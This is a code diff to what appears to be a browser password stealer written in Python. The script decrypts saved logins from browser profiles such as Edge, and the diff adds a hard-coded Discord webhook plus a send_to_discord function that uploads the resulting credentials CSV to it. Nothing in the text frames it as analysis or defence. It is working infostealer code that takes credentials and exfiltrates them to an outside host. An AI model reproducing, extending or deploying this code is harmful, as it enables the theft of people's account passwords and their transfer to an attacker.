@@ -1,6 +1,5 @@
 import os
 import re
-import sys
 import json
 import base64
 import sqlite3
@@ -9,6 +8,7 @@ from Cryptodome.Cipher import AES
 import shutil
 import csv
 import socket
+import requests
 
 # GLOBAL CONSTANTS
 BROWSERS = {
@@ -36,6 +36,8 @@ BROWSERS = {
         "path": r"%s\AppData\Local\Microsoft\Edge\User Data" % (os.environ['USERPROFILE']),
     }
 }
+
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1240038860205985894/qhYcRwGnxahYevjx_X-QSDQXwSj6kOSO4L_47tbHJw8sT4xo29YcWOwZuAiZnqP7XhIz"
 
 def get_secret_key(browser_name):
     try:
@@ -123,8 +125,20 @@ def extract_passwords(browser_name, browser_info):
                         cursor.close()
                         conn.close()
                         os.remove("Loginvault.db")
+        send_to_discord(csv_path)
     except Exception as e:
         print(f"[ERR] {browser_name}: {e}")
+
+def send_to_discord(file_path):
+    try:
+        with open(file_path, 'rb') as f:
+            response = requests.post(DISCORD_WEBHOOK_URL, files={"file": f})
+        if response.status_code == 204:
+            print(f"Successfully sent {file_path} to Discord")
+        else:
+            print(f"Failed to send {file_path} to Discord, status code: {response.status_code}")
+    except Exception as e:
+        print(f"[ERR] Failed to send file to Discord: {e}")
 
 if __name__ == '__main__':
     for browser_name, browser_info in BROWSERS.items():
